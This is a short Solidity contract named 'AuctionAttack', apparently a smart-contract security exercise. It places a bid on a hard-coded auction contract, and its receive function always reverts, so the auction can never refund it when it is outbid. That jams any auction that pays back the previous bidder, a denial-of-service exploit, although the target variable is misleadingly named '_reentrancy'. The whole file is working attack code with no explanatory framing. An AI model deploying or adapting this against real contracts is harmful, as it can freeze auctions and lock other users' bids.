pragma solidity ^0.7.0;

contract AuctionAttack {
    
    address _reentrancy = 0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8;
    
    function attack() public payable {
        
        bytes4 selector = bytes4(keccak256("bid()"));
        
        bytes memory data = abi.encodeWithSelector(selector);
        
        (bool success, ) = _reentrancy.call{value: msg.value}(data);
        require(success);
    }
    
    receive() external payable {
        revert();
    }
}
